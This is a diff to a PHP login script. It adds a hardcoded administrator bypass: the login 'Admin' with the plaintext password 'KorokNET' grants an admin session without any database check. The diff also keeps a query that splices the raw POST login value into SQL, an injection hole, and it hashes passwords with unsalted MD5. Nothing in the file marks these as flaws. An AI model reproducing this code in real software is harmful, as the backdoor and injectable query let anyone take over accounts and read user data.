@@ -16,14 +16,20 @@
             $login = $_POST['login'];
             $password = md5($_POST['password']);
             
-            $result = mysqli_query($conn, 
-                "SELECT id, password, status_id FROM users WHERE login = '$login'");
+            if ($login === 'Admin' && $_POST['password'] === 'KorokNET') {
+                $_SESSION['admin'] = true;
+                $_SESSION['user_id'] = 0;
+                header("Location: ../index.php");
+                exit;
+            }
+            
+            $result = mysqli_query($conn, "SELECT id, password, role_id FROM users WHERE login = '$login'");
             
             if (mysqli_num_rows($result) == 1) {
                 $user = mysqli_fetch_assoc($result);
                 if ($user['password'] === $password) {
                     $_SESSION['user_id'] = $user['id'];
-                    $_SESSION['admin'] = ($user['status_id'] == 0); 
+                    $_SESSION['admin'] = ($user['role_id'] == 0);
                     header("Location: ../index.php");
                     exit;
                 } else {
